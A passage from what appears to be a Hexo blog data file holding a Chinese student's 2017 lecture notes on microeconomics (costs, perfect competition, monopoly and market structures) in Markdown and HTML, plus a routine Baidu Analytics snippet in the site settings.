VC`，则企业应停止营业\n\n上式两边除以产量Q得：`P < AVC`\n\n#### 退出市场\n\n* 成本：收益损失（TR）\n* 收益：节约成本（TC）\n\n若`TR < TC`（`P < ATC`），则企业应退出市场\n若`TR > TC`（`P > ATC`）, 则一个新企业将进入市场\n\n## 竞争市场的供应曲线\n\n长期中，由于企业可自由进入与退出市场，因而市场中企业的数量会发生变化。\n* 如果市场上的企业获得正的经济利润：\n    * 新企业会进入，短期市场供给向右移动\n    * 价格下降，利润降低，企业进入速度减慢\n* 如果市场上的企业有亏损（经济利润<0）：\n    * 一些企业会退出市场，短期市场供给向左移动\n    * 价格上升，减少仍在市场上企业的损失\n\n### 长期均衡：\n\n在进入和退出过程结束时，仍然留在市场中的企业的经济利润必定为零\n\n## 小结\n\n* 利润最大化：`MC = MR`\n* 完全竞争：`P = MR`\n* 所以完全竞争均衡：`P = MC`\n\n# 第九章 完全垄断市场\n\n* 完全垄断企业：唯一卖者且产品无相近替代品\n\n* 市场势力：垄断企业能影响市场的能力（竞争性企业则没有市场势力）\n\n## 为什么产生垄断\n\n基本原因：存在进入壁垒\n\n> 进入壁垒的形成原因\n> * 垄断资源\n> * 政府造成的垄断\n> * 自然垄断  \n\n## 垄断决策\n\n市场需求曲线向下倾斜\n\n于是在竞争市场中各竞争企业共同面对，在市场价格上，各企业的需求曲线时水平的\n\n而对于垄断企业需要独自面对整个市场的需求曲线，因此其需求曲线向右下方倾斜\n\n垄断者特点\n\n* `MR < P`\n* 没有供给曲线（因为产量不由价格决定，由其自身的MC、MR与需求曲线决定）\n\n## 垄断的福利代价\n\n* 垄断者生产的产量小于社会有效率的产量\n* 垄断会导致无谓损失\n\n## 价格歧视\n\n企业以不同价格向不同顾客出售同一种物品的经营做法，尽管生产成本都是相同的。\n\n* 价格歧视是利润最大化垄断者的一种理性策略\n* 价格歧视要求能根据支付意愿划分顾客\n* 价格歧视可以消除垄断定价中固有的无效率，从而增进经济福利。\n\n## 对垄断的公共政策\n\n* 用反托拉斯法（遏制垄断权力）增强竞争：\n* 管制垄断者的行为（针对私人经营的自然垄断）\n* 公有制\n* 无作为（以上反垄断和垄断都有自己的缺点）\n\n## 垄断是普遍的\n\n许多企业都有市场势力，即垄断是普遍的\n\n> 垄断力量是一个程度问题\n\n# 垄断竞争市场\n\n* 寡头竞争\n* 垄断竞争\n\n|竞争类型|完全竞争|垄断竞争|完全垄断|\n|:-----:|:------:|:-----:|:-----:|\n|卖者的数量|许多|许多|一个|\n|自由进入/退出市场|是|是|不是|\n|长期经济利润|零利润|零利润|正利润|\n|企业出售的产品|完全相同|不同(有相似替代品)|完全不同(无相似替代品)|\n|市场势力|没有，价格接收者|有|有|\n|企业面临的需求曲线|水平|向右下方倾斜|向右下方倾斜|\n","source":"_posts/第四讲——生产者决策.md","raw":"---\n\ntitle: 第四讲——生产者决策\n\n---\n\n> 明天考选修，贴个[哭]\n\n<!-- more -->\n\n# 第七章 生产成本\n\n## 机会成本\n\n会计：显性成本\n经济学家：隐性成本 +显性成本\n\n例子\n\n办公室的均衡租金上涨了$500/每月 \n在以下情形下，比较对会计利润与经济利润的影响：\na.\t你租用办公室\nb.  你自己拥有办公室\n\n> 办公室的均衡租金上涨了$500/每月 \n>\n> a. 你租用办公室\n>    显性成本增加了$500/每月。会计利润与经济利润都减少了$500/每月 \n>\n> b. 你自己拥有办公室\n>    显性成本没有变化，因此会计利润也不会变。隐性成本增加了$500/每月（使用你办公室的机会成本是租用它的价格），因此经济利润减少了$500/每月\n\n## 生产函数\n\n在一定技术水平下，生产要素的数量和某种组合与它所能生产出来的最大产量之间依存关系的函数。\n\n* 总产量（TP）\n* 平均产量（AP）\n* 边际产量（MP）\n* 实际生产量（Q）\n\n=> \n\n边际常量递减规律（边际收益递减规律）\n\n> 在技术不变情况下， 其他生产要素投入不变，某种生产要素的增加最初使产量增加，但增加超过一定限度时，增加的产量将要递减，最终还会使产量绝对降低。\n\n## 成本函数\n\n* 总成本（TC）\n    * 固定成本（FC）：不随着产量变动而变动的成本（如设备成本，租金成本）\n    * 可变成本（VC）：随着产量变动而变动的成本（如劳动力成本，原材料成本）\n* 边际成本（MC）\n* 平均总成本（ATC）：`TC / Q`\n* 平均固定成本（AFC）：`FC / Q`\n* 平均可变成本（AVC）：`VC / Q`\n\n### 有效规模\n\n使平均总成本最小的产量\n\n边际成本曲线与平均总成本曲线相交于有效规模点\n\n### 生产规模\n\n* 规模经济：长期平均总成本随产量增加而减少\n* 规模不经济：长期平均总成本随产量增加而增加\n\n# 第八章 完全竞争市场\n\n## 竞争企业的收益\n\n* 总收益（TR）：`P * Q`\n* 平均收益（AR）：`AR = TR / Q = P`\n* 边际收益（MR）\n\n> 完全竞争市场中，对于一个竞争企业而言： `MR = P` \n> 作为价格接受者，一个竞争企业能够增加它的产量，而不影响市场价格\n\n## 利润最大化与竞争企业的供给曲线\n\n### 利润最大化\n\n考虑MR与MC的关系，二者相等时为利润最大化的产量\n\n> `MR = P`为一条水平线，MC为一条斜率为正的线\n\n### 停止营业与退出市场\n\n* 停止营业：仍支付固定成本\n* 退出市场：没有任何成本\n\n#### 沉没成本\n\n已经发生而且无法收回的成本\n\n> 固定成本是一种沉没成本：无论企业决定生产或停止营业，都必须支付固定成本\n> 沉没成本应该与决策无关：无论做怎样的决策，都必须支付它们\n\n#### 停止营业\n\n* 成本：收益损失（TR）\n* 收益：节约成本（VC）\n\n若`TR < VC`，则企业应停止营业\n\n上式两边除以产量Q得：`P < AVC`\n\n#### 退出市场\n\n* 成本：收益损失（TR）\n* 收益：节约成本（TC）\n\n若`TR < TC`（`P < ATC`），则企业应退出市场\n若`TR > TC`（`P > ATC`）, 则一个新企业将进入市场\n\n## 竞争市场的供应曲线\n\n长期中，由于企业可自由进入与退出市场，因而市场中企业的数量会发生变化。\n* 如果市场上的企业获得正的经济利润：\n    * 新企业会进入，短期市场供给向右移动\n    * 价格下降，利润降低，企业进入速度减慢\n* 如果市场上的企业有亏损（经济利润<0）：\n    * 一些企业会退出市场，短期市场供给向左移动\n    * 价格上升，减少仍在市场上企业的损失\n\n### 长期均衡：\n\n在进入和退出过程结束时，仍然留在市场中的企业的经济利润必定为零\n\n## 小结\n\n* 利润最大化：`MC = MR`\n* 完全竞争：`P = MR`\n* 所以完全竞争均衡：`P = MC`\n\n# 第九章 完全垄断市场\n\n* 完全垄断企业：唯一卖者且产品无相近替代品\n\n* 市场势力：垄断企业能影响市场的能力（竞争性企业则没有市场势力）\n\n## 为什么产生垄断\n\n基本原因：存在进入壁垒\n\n> 进入壁垒的形成原因\n> * 垄断资源\n> * 政府造成的垄断\n> * 自然垄断  \n\n## 垄断决策\n\n市场需求曲线向下倾斜\n\n于是在竞争市场中各竞争企业共同面对，在市场价格上，各企业的需求曲线时水平的\n\n而对于垄断企业需要独自面对整个市场的需求曲线，因此其需求曲线向右下方倾斜\n\n垄断者特点\n\n* `MR < P`\n* 没有供给曲线（因为产量不由价格决定，由其自身的MC、MR与需求曲线决定）\n\n## 垄断的福利代价\n\n* 垄断者生产的产量小于社会有效率的产量\n* 垄断会导致无谓损失\n\n## 价格歧视\n\n企业以不同价格向不同顾客出售同一种物品的经营做法，尽管生产成本都是相同的。\n\n* 价格歧视是利润最大化垄断者的一种理性策略\n* 价格歧视要求能根据支付意愿划分顾客\n* 价格歧视可以消除垄断定价中固有的无效率，从而增进经济福利。\n\n## 对垄断的公共政策\n\n* 用反托拉斯法（遏制垄断权力）增强竞争：\n* 管制垄断者的行为（针对私人经营的自然垄断）\n* 公有制\n* 无作为（以上反垄断和垄断都有自己的缺点）\n\n## 垄断是普遍的\n\n许多企业都有市场势力，即垄断是普遍的\n\n> 垄断力量是一个程度问题\n\n# 垄断竞争市场\n\n* 寡头竞争\n* 垄断竞争\n\n|竞争类型|完全竞争|垄断竞争|完全垄断|\n|:-----:|:------:|:-----:|:-----:|\n|卖者的数量|许多|许多|一个|\n|自由进入/退出市场|是|是|不是|\n|长期经济利润|零利润|零利润|正利润|\n|企业出售的产品|完全相同|不同(有相似替代品)|完全不同(无相似替代品)|\n|市场势力|没有，价格接收者|有|有|\n|企业面临的需求曲线|水平|向右下方倾斜|向右下方倾斜|\n","slug":"第四讲——生产者决策","published":1,"date":"2017-05-07T12:33:37.690Z","updated":"2017-05-07T12:33:28.099Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4v000ol8sl70etyl9p","content":"<blockquote>\n<p>明天考选修，贴个[哭]</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"第七章-生产成本\"><a href=\"#第七章-生产成本\" class=\"headerlink\" title=\"第七章 生产成本\"></a>第七章 生产成本</h1><h2 id=\"机会成本\"><a href=\"#机会成本\" class=\"headerlink\" title=\"机会成本\"></a>机会成本</h2><p>会计：显性成本<br>经济学家：隐性成本 +显性成本</p>\n<p>例子</p>\n<p>办公室的均衡租金上涨了$500/每月<br>在以下情形下，比较对会计利润与经济利润的影响：<br>a.    你租用办公室<br>b.  你自己拥有办公室</p>\n<blockquote>\n<p>办公室的均衡租金上涨了$500/每月 </p>\n<p>a. 你租用办公室<br>   显性成本增加了$500/每月。会计利润与经济利润都减少了$500/每月 </p>\n<p>b. 你自己拥有办公室<br>   显性成本没有变化，因此会计利润也不会变。隐性成本增加了$500/每月（使用你办公室的机会成本是租用它的价格），因此经济利润减少了$500/每月</p>\n</blockquote>\n<h2 id=\"生产函数\"><a href=\"#生产函数\" class=\"headerlink\" title=\"生产函数\"></a>生产函数</h2><p>在一定技术水平下，生产要素的数量和某种组合与它所能生产出来的最大产量之间依存关系的函数。</p>\n<ul>\n<li>总产量（TP）</li>\n<li>平均产量（AP）</li>\n<li>边际产量（MP）</li>\n<li>实际生产量（Q）</li>\n</ul>\n<p>=&gt; </p>\n<p>边际常量递减规律（边际收益递减规律）</p>\n<blockquote>\n<p>在技术不变情况下， 其他生产要素投入不变，某种生产要素的增加最初使产量增加，但增加超过一定限度时，增加的产量将要递减，最终还会使产量绝对降低。</p>\n</blockquote>\n<h2 id=\"成本函数\"><a href=\"#成本函数\" class=\"headerlink\" title=\"成本函数\"></a>成本函数</h2><ul>\n<li>总成本（TC）<ul>\n<li>固定成本（FC）：不随着产量变动而变动的成本（如设备成本，租金成本）</li>\n<li>可变成本（VC）：随着产量变动而变动的成本（如劳动力成本，原材料成本）</li>\n</ul>\n</li>\n<li>边际成本（MC）</li>\n<li>平均总成本（ATC）：<code>TC / Q</code></li>\n<li>平均固定成本（AFC）：<code>FC / Q</code></li>\n<li>平均可变成本（AVC）：<code>VC / Q</code></li>\n</ul>\n<h3 id=\"有效规模\"><a href=\"#有效规模\" class=\"headerlink\" title=\"有效规模\"></a>有效规模</h3><p>使平均总成本最小的产量</p>\n<p>边际成本曲线与平均总成本曲线相交于有效规模点</p>\n<h3 id=\"生产规模\"><a href=\"#生产规模\" class=\"headerlink\" title=\"生产规模\"></a>生产规模</h3><ul>\n<li>规模经济：长期平均总成本随产量增加而减少</li>\n<li>规模不经济：长期平均总成本随产量增加而增加</li>\n</ul>\n<h1 id=\"第八章-完全竞争市场\"><a href=\"#第八章-完全竞争市场\" class=\"headerlink\" title=\"第八章 完全竞争市场\"></a>第八章 完全竞争市场</h1><h2 id=\"竞争企业的收益\"><a href=\"#竞争企业的收益\" class=\"headerlink\" title=\"竞争企业的收益\"></a>竞争企业的收益</h2><ul>\n<li>总收益（TR）：<code>P * Q</code></li>\n<li>平均收益（AR）：<code>AR = TR / Q = P</code></li>\n<li>边际收益（MR）</li>\n</ul>\n<blockquote>\n<p>完全竞争市场中，对于一个竞争企业而言： <code>MR = P</code><br>作为价格接受者，一个竞争企业能够增加它的产量，而不影响市场价格</p>\n</blockquote>\n<h2 id=\"利润最大化与竞争企业的供给曲线\"><a href=\"#利润最大化与竞争企业的供给曲线\" class=\"headerlink\" title=\"利润最大化与竞争企业的供给曲线\"></a>利润最大化与竞争企业的供给曲线</h2><h3 id=\"利润最大化\"><a href=\"#利润最大化\" class=\"headerlink\" title=\"利润最大化\"></a>利润最大化</h3><p>考虑MR与MC的关系，二者相等时为利润最大化的产量</p>\n<blockquote>\n<p><code>MR = P</code>为一条水平线，MC为一条斜率为正的线</p>\n</blockquote>\n<h3 id=\"停止营业与退出市场\"><a href=\"#停止营业与退出市场\" class=\"headerlink\" title=\"停止营业与退出市场\"></a>停止营业与退出市场</h3><ul>\n<li>停止营业：仍支付固定成本</li>\n<li>退出市场：没有任何成本</li>\n</ul>\n<h4 id=\"沉没成本\"><a href=\"#沉没成本\" class=\"headerlink\" title=\"沉没成本\"></a>沉没成本</h4><p>已经发生而且无法收回的成本</p>\n<blockquote>\n<p>固定成本是一种沉没成本：无论企业决定生产或停止营业，都必须支付固定成本<br>沉没成本应该与决策无关：无论做怎样的决策，都必须支付它们</p>\n</blockquote>\n<h4 id=\"停止营业\"><a href=\"#停止营业\" class=\"headerlink\" title=\"停止营业\"></a>停止营业</h4><ul>\n<li>成本：收益损失（TR）</li>\n<li>收益：节约成本（VC）</li>\n</ul>\n<p>若<code>TR &lt; VC</code>，则企业应停止营业</p>\n<p>上式两边除以产量Q得：<code>P &lt; AVC</code></p>\n<h4 id=\"退出市场\"><a href=\"#退出市场\" class=\"headerlink\" title=\"退出市场\"></a>退出市场</h4><ul>\n<li>成本：收益损失（TR）</li>\n<li>收益：节约成本（TC）</li>\n</ul>\n<p>若<code>TR &lt; TC</code>（<code>P &lt; ATC</code>），则企业应退出市场<br>若<code>TR &gt; TC</code>（<code>P &gt; ATC</code>）, 则一个新企业将进入市场</p>\n<h2 id=\"竞争市场的供应曲线\"><a href=\"#竞争市场的供应曲线\" class=\"headerlink\" title=\"竞争市场的供应曲线\"></a>竞争市场的供应曲线</h2><p>长期中，由于企业可自由进入与退出市场，因而市场中企业的数量会发生变化。</p>\n<ul>\n<li>如果市场上的企业获得正的经济利润：<ul>\n<li>新企业会进入，短期市场供给向右移动</li>\n<li>价格下降，利润降低，企业进入速度减慢</li>\n</ul>\n</li>\n<li>如果市场上的企业有亏损（经济利润&lt;0）：<ul>\n<li>一些企业会退出市场，短期市场供给向左移动</li>\n<li>价格上升，减少仍在市场上企业的损失</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"长期均衡：\"><a href=\"#长期均衡：\" class=\"headerlink\" title=\"长期均衡：\"></a>长期均衡：</h3><p>在进入和退出过程结束时，仍然留在市场中的企业的经济利润必定为零</p>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><ul>\n<li>利润最大化：<code>MC = MR</code></li>\n<li>完全竞争：<code>P = MR</code></li>\n<li>所以完全竞争均衡：<code>P = MC</code></li>\n</ul>\n<h1 id=\"第九章-完全垄断市场\"><a href=\"#第九章-完全垄断市场\" class=\"headerlink\" title=\"第九章 完全垄断市场\"></a>第九章 完全垄断市场</h1><ul>\n<li><p>完全垄断企业：唯一卖者且产品无相近替代品</p>\n</li>\n<li><p>市场势力：垄断企业能影响市场的能力（竞争性企业则没有市场势力）</p>\n</li>\n</ul>\n<h2 id=\"为什么产生垄断\"><a href=\"#为什么产生垄断\" class=\"headerlink\" title=\"为什么产生垄断\"></a>为什么产生垄断</h2><p>基本原因：存在进入壁垒</p>\n<blockquote>\n<p>进入壁垒的形成原因</p>\n<ul>\n<li>垄断资源</li>\n<li>政府造成的垄断</li>\n<li>自然垄断  </li>\n</ul>\n</blockquote>\n<h2 id=\"垄断决策\"><a href=\"#垄断决策\" class=\"headerlink\" title=\"垄断决策\"></a>垄断决策</h2><p>市场需求曲线向下倾斜</p>\n<p>于是在竞争市场中各竞争企业共同面对，在市场价格上，各企业的需求曲线时水平的</p>\n<p>而对于垄断企业需要独自面对整个市场的需求曲线，因此其需求曲线向右下方倾斜</p>\n<p>垄断者特点</p>\n<ul>\n<li><code>MR &lt; P</code></li>\n<li>没有供给曲线（因为产量不由价格决定，由其自身的MC、MR与需求曲线决定）</li>\n</ul>\n<h2 id=\"垄断的福利代价\"><a href=\"#垄断的福利代价\" class=\"headerlink\" title=\"垄断的福利代价\"></a>垄断的福利代价</h2><ul>\n<li>垄断者生产的产量小于社会有效率的产量</li>\n<li>垄断会导致无谓损失</li>\n</ul>\n<h2 id=\"价格歧视\"><a href=\"#价格歧视\" class=\"headerlink\" title=\"价格歧视\"></a>价格歧视</h2><p>企业以不同价格向不同顾客出售同一种物品的经营做法，尽管生产成本都是相同的。</p>\n<ul>\n<li>价格歧视是利润最大化垄断者的一种理性策略</li>\n<li>价格歧视要求能根据支付意愿划分顾客</li>\n<li>价格歧视可以消除垄断定价中固有的无效率，从而增进经济福利。</li>\n</ul>\n<h2 id=\"对垄断的公共政策\"><a href=\"#对垄断的公共政策\" class=\"headerlink\" title=\"对垄断的公共政策\"></a>对垄断的公共政策</h2><ul>\n<li>用反托拉斯法（遏制垄断权力）增强竞争：</li>\n<li>管制垄断者的行为（针对私人经营的自然垄断）</li>\n<li>公有制</li>\n<li>无作为（以上反垄断和垄断都有自己的缺点）</li>\n</ul>\n<h2 id=\"垄断是普遍的\"><a href=\"#垄断是普遍的\" class=\"headerlink\" title=\"垄断是普遍的\"></a>垄断是普遍的</h2><p>许多企业都有市场势力，即垄断是普遍的</p>\n<blockquote>\n<p>垄断力量是一个程度问题</p>\n</blockquote>\n<h1 id=\"垄断竞争市场\"><a href=\"#垄断竞争市场\" class=\"headerlink\" title=\"垄断竞争市场\"></a>垄断竞争市场</h1><ul>\n<li>寡头竞争</li>\n<li>垄断竞争</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">竞争类型</th>\n<th style=\"text-align:center\">完全竞争</th>\n<th style=\"text-align:center\">垄断竞争</th>\n<th style=\"text-align:center\">完全垄断</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">卖者的数量</td>\n<td style=\"text-align:center\">许多</td>\n<td style=\"text-align:center\">许多</td>\n<td style=\"text-align:center\">一个</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">自由进入/退出市场</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">不是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">长期经济利润</td>\n<td style=\"text-align:center\">零利润</td>\n<td style=\"text-align:center\">零利润</td>\n<td style=\"text-align:center\">正利润</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">企业出售的产品</td>\n<td style=\"text-align:center\">完全相同</td>\n<td style=\"text-align:center\">不同(有相似替代品)</td>\n<td style=\"text-align:center\">完全不同(无相似替代品)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">市场势力</td>\n<td style=\"text-align:center\">没有，价格接收者</td>\n<td style=\"text-align:center\">有</td>\n<td style=\"text-align:center\">有</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">企业面临的需求曲线</td>\n<td style=\"text-align:center\">水平</td>\n<td style=\"text-align:center\">向右下方倾斜</td>\n<td style=\"text-align:center\">向右下方倾斜</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>明天考选修，贴个[哭]</p>\n</blockquote>","more":"<h1 id=\"第七章-生产成本\"><a href=\"#第七章-生产成本\" class=\"headerlink\" title=\"第七章 生产成本\"></a>第七章 生产成本</h1><h2 id=\"机会成本\"><a href=\"#机会成本\" class=\"headerlink\" title=\"机会成本\"></a>机会成本</h2><p>会计：显性成本<br>经济学家：隐性成本 +显性成本</p>\n<p>例子</p>\n<p>办公室的均衡租金上涨了$500/每月<br>在以下情形下，比较对会计利润与经济利润的影响：<br>a.    你租用办公室<br>b.  你自己拥有办公室</p>\n<blockquote>\n<p>办公室的均衡租金上涨了$500/每月 </p>\n<p>a. 你租用办公室<br>   显性成本增加了$500/每月。会计利润与经济利润都减少了$500/每月 </p>\n<p>b. 你自己拥有办公室<br>   显性成本没有变化，因此会计利润也不会变。隐性成本增加了$500/每月（使用你办公室的机会成本是租用它的价格），因此经济利润减少了$500/每月</p>\n</blockquote>\n<h2 id=\"生产函数\"><a href=\"#生产函数\" class=\"headerlink\" title=\"生产函数\"></a>生产函数</h2><p>在一定技术水平下，生产要素的数量和某种组合与它所能生产出来的最大产量之间依存关系的函数。</p>\n<ul>\n<li>总产量（TP）</li>\n<li>平均产量（AP）</li>\n<li>边际产量（MP）</li>\n<li>实际生产量（Q）</li>\n</ul>\n<p>=&gt; </p>\n<p>边际常量递减规律（边际收益递减规律）</p>\n<blockquote>\n<p>在技术不变情况下， 其他生产要素投入不变，某种生产要素的增加最初使产量增加，但增加超过一定限度时，增加的产量将要递减，最终还会使产量绝对降低。</p>\n</blockquote>\n<h2 id=\"成本函数\"><a href=\"#成本函数\" class=\"headerlink\" title=\"成本函数\"></a>成本函数</h2><ul>\n<li>总成本（TC）<ul>\n<li>固定成本（FC）：不随着产量变动而变动的成本（如设备成本，租金成本）</li>\n<li>可变成本（VC）：随着产量变动而变动的成本（如劳动力成本，原材料成本）</li>\n</ul>\n</li>\n<li>边际成本（MC）</li>\n<li>平均总成本（ATC）：<code>TC / Q</code></li>\n<li>平均固定成本（AFC）：<code>FC / Q</code></li>\n<li>平均可变成本（AVC）：<code>VC / Q</code></li>\n</ul>\n<h3 id=\"有效规模\"><a href=\"#有效规模\" class=\"headerlink\" title=\"有效规模\"></a>有效规模</h3><p>使平均总成本最小的产量</p>\n<p>边际成本曲线与平均总成本曲线相交于有效规模点</p>\n<h3 id=\"生产规模\"><a href=\"#生产规模\" class=\"headerlink\" title=\"生产规模\"></a>生产规模</h3><ul>\n<li>规模经济：长期平均总成本随产量增加而减少</li>\n<li>规模不经济：长期平均总成本随产量增加而增加</li>\n</ul>\n<h1 id=\"第八章-完全竞争市场\"><a href=\"#第八章-完全竞争市场\" class=\"headerlink\" title=\"第八章 完全竞争市场\"></a>第八章 完全竞争市场</h1><h2 id=\"竞争企业的收益\"><a href=\"#竞争企业的收益\" class=\"headerlink\" title=\"竞争企业的收益\"></a>竞争企业的收益</h2><ul>\n<li>总收益（TR）：<code>P * Q</code></li>\n<li>平均收益（AR）：<code>AR = TR / Q = P</code></li>\n<li>边际收益（MR）</li>\n</ul>\n<blockquote>\n<p>完全竞争市场中，对于一个竞争企业而言： <code>MR = P</code><br>作为价格接受者，一个竞争企业能够增加它的产量，而不影响市场价格</p>\n</blockquote>\n<h2 id=\"利润最大化与竞争企业的供给曲线\"><a href=\"#利润最大化与竞争企业的供给曲线\" class=\"headerlink\" title=\"利润最大化与竞争企业的供给曲线\"></a>利润最大化与竞争企业的供给曲线</h2><h3 id=\"利润最大化\"><a href=\"#利润最大化\" class=\"headerlink\" title=\"利润最大化\"></a>利润最大化</h3><p>考虑MR与MC的关系，二者相等时为利润最大化的产量</p>\n<blockquote>\n<p><code>MR = P</code>为一条水平线，MC为一条斜率为正的线</p>\n</blockquote>\n<h3 id=\"停止营业与退出市场\"><a href=\"#停止营业与退出市场\" class=\"headerlink\" title=\"停止营业与退出市场\"></a>停止营业与退出市场</h3><ul>\n<li>停止营业：仍支付固定成本</li>\n<li>退出市场：没有任何成本</li>\n</ul>\n<h4 id=\"沉没成本\"><a href=\"#沉没成本\" class=\"headerlink\" title=\"沉没成本\"></a>沉没成本</h4><p>已经发生而且无法收回的成本</p>\n<blockquote>\n<p>固定成本是一种沉没成本：无论企业决定生产或停止营业，都必须支付固定成本<br>沉没成本应该与决策无关：无论做怎样的决策，都必须支付它们</p>\n</blockquote>\n<h4 id=\"停止营业\"><a href=\"#停止营业\" class=\"headerlink\" title=\"停止营业\"></a>停止营业</h4><ul>\n<li>成本：收益损失（TR）</li>\n<li>收益：节约成本（VC）</li>\n</ul>\n<p>若<code>TR &lt; VC</code>，则企业应停止营业</p>\n<p>上式两边除以产量Q得：<code>P &lt; AVC</code></p>\n<h4 id=\"退出市场\"><a href=\"#退出市场\" class=\"headerlink\" title=\"退出市场\"></a>退出市场</h4><ul>\n<li>成本：收益损失（TR）</li>\n<li>收益：节约成本（TC）</li>\n</ul>\n<p>若<code>TR &lt; TC</code>（<code>P &lt; ATC</code>），则企业应退出市场<br>若<code>TR &gt; TC</code>（<code>P &gt; ATC</code>）, 则一个新企业将进入市场</p>\n<h2 id=\"竞争市场的供应曲线\"><a href=\"#竞争市场的供应曲线\" class=\"headerlink\" title=\"竞争市场的供应曲线\"></a>竞争市场的供应曲线</h2><p>长期中，由于企业可自由进入与退出市场，因而市场中企业的数量会发生变化。</p>\n<ul>\n<li>如果市场上的企业获得正的经济利润：<ul>\n<li>新企业会进入，短期市场供给向右移动</li>\n<li>价格下降，利润降低，企业进入速度减慢</li>\n</ul>\n</li>\n<li>如果市场上的企业有亏损（经济利润&lt;0）：<ul>\n<li>一些企业会退出市场，短期市场供给向左移动</li>\n<li>价格上升，减少仍在市场上企业的损失</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"长期均衡：\"><a href=\"#长期均衡：\" class=\"headerlink\" title=\"长期均衡：\"></a>长期均衡：</h3><p>在进入和退出过程结束时，仍然留在市场中的企业的经济利润必定为零</p>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><ul>\n<li>利润最大化：<code>MC = MR</code></li>\n<li>完全竞争：<code>P = MR</code></li>\n<li>所以完全竞争均衡：<code>P = MC</code></li>\n</ul>\n<h1 id=\"第九章-完全垄断市场\"><a href=\"#第九章-完全垄断市场\" class=\"headerlink\" title=\"第九章 完全垄断市场\"></a>第九章 完全垄断市场</h1><ul>\n<li><p>完全垄断企业：唯一卖者且产品无相近替代品</p>\n</li>\n<li><p>市场势力：垄断企业能影响市场的能力（竞争性企业则没有市场势力）</p>\n</li>\n</ul>\n<h2 id=\"为什么产生垄断\"><a href=\"#为什么产生垄断\" class=\"headerlink\" title=\"为什么产生垄断\"></a>为什么产生垄断</h2><p>基本原因：存在进入壁垒</p>\n<blockquote>\n<p>进入壁垒的形成原因</p>\n<ul>\n<li>垄断资源</li>\n<li>政府造成的垄断</li>\n<li>自然垄断  </li>\n</ul>\n</blockquote>\n<h2 id=\"垄断决策\"><a href=\"#垄断决策\" class=\"headerlink\" title=\"垄断决策\"></a>垄断决策</h2><p>市场需求曲线向下倾斜</p>\n<p>于是在竞争市场中各竞争企业共同面对，在市场价格上，各企业的需求曲线时水平的</p>\n<p>而对于垄断企业需要独自面对整个市场的需求曲线，因此其需求曲线向右下方倾斜</p>\n<p>垄断者特点</p>\n<ul>\n<li><code>MR &lt; P</code></li>\n<li>没有供给曲线（因为产量不由价格决定，由其自身的MC、MR与需求曲线决定）</li>\n</ul>\n<h2 id=\"垄断的福利代价\"><a href=\"#垄断的福利代价\" class=\"headerlink\" title=\"垄断的福利代价\"></a>垄断的福利代价</h2><ul>\n<li>垄断者生产的产量小于社会有效率的产量</li>\n<li>垄断会导致无谓损失</li>\n</ul>\n<h2 id=\"价格歧视\"><a href=\"#价格歧视\" class=\"headerlink\" title=\"价格歧视\"></a>价格歧视</h2><p>企业以不同价格向不同顾客出售同一种物品的经营做法，尽管生产成本都是相同的。</p>\n<ul>\n<li>价格歧视是利润最大化垄断者的一种理性策略</li>\n<li>价格歧视要求能根据支付意愿划分顾客</li>\n<li>价格歧视可以消除垄断定价中固有的无效率，从而增进经济福利。</li>\n</ul>\n<h2 id=\"对垄断的公共政策\"><a href=\"#对垄断的公共政策\" class=\"headerlink\" title=\"对垄断的公共政策\"></a>对垄断的公共政策</h2><ul>\n<li>用反托拉斯法（遏制垄断权力）增强竞争：</li>\n<li>管制垄断者的行为（针对私人经营的自然垄断）</li>\n<li>公有制</li>\n<li>无作为（以上反垄断和垄断都有自己的缺点）</li>\n</ul>\n<h2 id=\"垄断是普遍的\"><a href=\"#垄断是普遍的\" class=\"headerlink\" title=\"垄断是普遍的\"></a>垄断是普遍的</h2><p>许多企业都有市场势力，即垄断是普遍的</p>\n<blockquote>\n<p>垄断力量是一个程度问题</p>\n</blockquote>\n<h1 id=\"垄断竞争市场\"><a href=\"#垄断竞争市场\" class=\"headerlink\" title=\"垄断竞争市场\"></a>垄断竞争市场</h1><ul>\n<li>寡头竞争</li>\n<li>垄断竞争</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">竞争类型</th>\n<th style=\"text-align:center\">完全竞争</th>\n<th style=\"text-align:center\">垄断竞争</th>\n<th style=\"text-align:center\">完全垄断</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">卖者的数量</td>\n<td style=\"text-align:center\">许多</td>\n<td style=\"text-align:center\">许多</td>\n<td style=\"text-align:center\">一个</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">自由进入/退出市场</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">不是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">长期经济利润</td>\n<td style=\"text-align:center\">零利润</td>\n<td style=\"text-align:center\">零利润</td>\n<td style=\"text-align:center\">正利润</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">企业出售的产品</td>\n<td style=\"text-align:center\">完全相同</td>\n<td style=\"text-align:center\">不同(有相似替代品)</td>\n<td style=\"text-align:center\">完全不同(无相似替代品)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">市场势力</td>\n<td style=\"text-align:center\">没有，价格接收者</td>\n<td style=\"text-align:center\">有</td>\n<td style=\"text-align:center\">有</td>\n</tr>\n<tr>\n<td 